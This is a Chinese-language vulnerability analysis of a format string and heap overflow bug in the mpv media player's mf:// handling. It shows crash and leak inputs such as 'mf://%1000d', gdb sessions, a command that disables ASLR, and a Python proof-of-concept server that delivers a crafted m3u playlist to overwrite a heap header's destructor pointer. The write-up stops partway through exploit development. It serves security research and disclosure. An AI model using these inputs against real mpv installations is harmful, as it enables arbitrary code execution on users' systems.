**作者：天融信阿尔法实验室  
原文链接：**
## 0x00 背景介绍
mpv项目是开源项目，可以在多个系统包括Windows、Linux、MacOs上运行，是一款流行的视频播放器，mpv软件在读取文件名称时存在格式化字符串漏洞，可以导致堆溢出并执行任意代码。
## 0x01 环境搭建
系统环境为Ubuntu x64位，软件环境可以通过两种方式搭建环境。
1.通过源码编译，源码地址为：
下载地址为：
2.直接安装安装包，安装后没有符号，调试不方便，可以使用以下三条命令来安装软件：
sudo add-apt-repository ppa:mc3man/mpv-tests
sudo apt-get update
sudo apt-get install mpv
参考
安装完成后运行软件如下所示：
## 0x02 漏洞复现
源代码：
demux_mf.c文件中154行存在对sprintf函数的调用，sprintf函数是格式化字符串函数，参数1是目标缓冲区，参数2是格式化字符串，参数2是可控的，第三个参数是循环次数，mpv程序本身支持文件名中传入一个%，可以使用%d打印这个循环次数，但是由于校验不严格，并没有校验其他的格式化字符串，以及%的个数，所以存在格式化字符串漏洞：
在demux_mf.c文件中127行会检查是否存在%，没有判断有几个%，以及%之后的参数。
程序存在格式化字符串漏洞，使用如下命令运行程序：./mpv -v mf://%p.%p.%p
运行mpv时使用-v参数可以打印出更加详细的信息，此时可以看到打印出了栈上的信息，格式化字符串漏洞造成了信息泄漏。
demux_mf.c文件中154行存在对sprintf函数的调用，sprintf函数是格式化字符串函数，参数1是缓冲区，参数2是格式化字符串，这是可控的，现在为了安全都使用snprintf函数，可以限制缓冲区的大小，使用sprintf函数会造成信息泄漏，图中fname是堆中的缓冲区地址：
程序自己实现了一个内存申请函数，包含自定义的块头结构，在函数的124行调用talloc_size来申请内存，申请大小为文件名的大小加32个字节，如果使用格式字符串例如%1000d，会把一个四字节数据扩展到占用1000个字节，这样会导致堆溢出。
上图中，启动mpv时传入参数 mf://%1000d会导致程序崩溃。
## 0x03 漏洞分析
通过源码编译后可以根据符号对程序下断点，先查看下open_mf_pattern漏洞函数：
后
使用gdb启动mpv程序:gdb ./mpv
\~~~
gdb-peda$ disassemble open_mf_pattern
Dump of assembler code for function open_mf_pattern:
\~~~
0x00000000001e44af : call 0x1305a0 
\~~~
可以看到在open_mf_pattern+0x559处调用的是sprintf_chk函数，这是因为使用源码编译时使用了FORTIFY_SOURCE选项，对sprintf函数的调用会自动修改为调用sprintf_chk函数，可以在gdb-peda下输入checksec检查:
gdb-peda$ checksec
CANARY : ENABLED
FORTIFY : ENABLED 可以看到开启了FORTIFY选项
NX : ENABLED
PIE : disabled
gdb-peda$
sprintf_chk函数有一个变量表明缓冲区的大小，但是因为此处缓冲区是通过talloc_size申请堆上的内存，所以没有办法在编译器确定缓冲区的大小，所以此函数使用0xFFFFFFFFFFFFFFFF来表明缓冲区的大小，这样我们就可以使用堆溢出来利用这个漏洞，实际操作中这个漏洞被利用可能性还是比较小的，本次在Ubuntu
20.04.1 LTS系统和关闭ASLR情况下利用此漏洞：
## 0x04 漏洞利用程序开发
开发利用程序前，需要使用sudo sh -c "echo 0 >
/proc/sys/kernel/randomize_va_space"命令关闭系统的ASLR功能。
mpv程序运行时会把格式化字符串块保存在自定义的块中，使用talloc_size来分配内存，还有自定义的堆头结构。
       struct ta_header {
    size_t size;               // size of theuser allocation
    // Invariant:parent!=NULL => prev==NULL
    struct ta_header *prev;     // siblings list(by destructor order)
    struct ta_header *next;
    // Invariant:parent==NULL || parent->child==this
    struct ta_header *child;    // points tofirst child
    struct ta_header *parent;   // set for_first_ child only, NULL otherwise
    void (*destructor)(void *);
    #ifTA_MEMORY_DEBUGGING
    unsigned int canary;
    struct ta_header *leak_next;
    struct ta_header *leak_prev;
    const char *name;
    #endif
    };
可以在ta.c文件中看到此结构的内容以及对应的函数，此结构中包含一个destructor，是析构指针，还有一个值是canary，编译选项TA_MEMORY_DEBUGGING默认是启用的，此值为固定值0xD3ADB3EF，是为了检测程序是否有异常。
当调用ta_free函数时会判断析构函数，如果析构函数不为空，那么会去调用析构函数。
在此函数内部还调用了get_header函数，函数内容为
根据堆块地址ptr往低地址偏移固定字节找到堆头结构地址tag_head*，然后调用ta_dbg_check_header函数
ta_dbg_check_header函数会检查canary值是否为0xD3ADB3EF，如果parent不为空，还会判断前向节点和父节点。
  * 5.1 覆盖destructor指针
漏洞利用思路为调用sprintf函数时堆溢出到下一个堆的头结构，改变堆头结构的析构指针，当调用ta_free函数时，如果析构指针不为空，那么就会调用析构函数。
mpv程序在运行时可以读取m3u文件列表，如使用命令：  
./mpv http://localhost:7000/x.m3u
mpv程序会去连接本地的7000端口，并获取x.m3u文件，获取的内容mf://及之后的内容保存在堆中，当mf://及之后的内容占用不同大小的空间时，程序会把文件名称的内容放在堆中不同的位置处，我们需要找到一个合适的大小来满足如下条件：当mpv将文件内容名称存放在堆中时，后面的内存内容包含一个自定义的堆头结构，这样当我们溢出数据时，可以操纵到后面的堆头结构内容。
使用如下的POC测试占用不同的空间可以将文件名称内容放到合适的地址处：
    \#!/usr/bin/env python3  
     import socket  
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.bind(('localhost', 7000))
      s.listen(5)
      c, a = s.accept()
      playlist = b'mf://'
       playlist += b'A'*0x40
      playlist += b'%d' # we need a '%' to reach vulnerable path
       d = b'HTTP/1.1 200 OK\r\n'
       d += b'Content-type: audio/x-mpegurl\r\n'
      d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
      d += b'\r\n'
      d += playlist
      c.send(d)
      c.close()
代码中使用playlist +=
b'A'*0x40来占位，0x40是经过测试的数据，笔者可以修改此值来测试占用多少字节可以申请一个合适的位置，运行此脚本文件。然后使用gdb调试mpv程序：gdb
./mpv
使用命令b *open_mf_pattern+559在调用sprintf_chk函数处下断点，使用命令运行 mpv程序：r
http://localhost:7000/x.m3u
可以看到第一个参数arg[0]数据为0x7fffec001210，使用命令 x/100xg
0x7fffec001210-0x50，往前偏移0x50是为了查看堆头结构的数据：
       gdb-peda$ x/100xg 0x7fffec001210-0x50
      0x7fffec0011c0:   0x0000000000000062  0x0000000000000000  [size]  |   [prev]
      0x7fffec0011d0:   0x0000000000000000  0x0000000000000000  [next]  |   [child]
      0x7fffec0011e0:   0x00007fffec0011400 0x0000000000000000  [parent]  | [destructor]
      0x7fffec001200:   0x0000000000000000  0x0000555556676b8f  [leak_prev] | [name]
      0x7fffec001210:   0x0000000000000000  0x0000000000000071 begin actual data
      \~~~
      0x7fffec001450:   0x0000000000000003  0x00007fffec004a80  [size]  |   [prev]
      0x7fffec001460:   0x0000000000000000  0x0000000000000000  [next]  |   [child]
      0x7fffec001470:   0x0000000000000000  0x0000000000000000  [parent]  | [destructor]
      0x7fffec001480:   0x00000000d3adb3ef  0x0000000000000000  [canary]  | [leak_next]
      0x7fffec001490:   0x0000000000000000  0x0000555556c288a0  [leak_prev] | [name]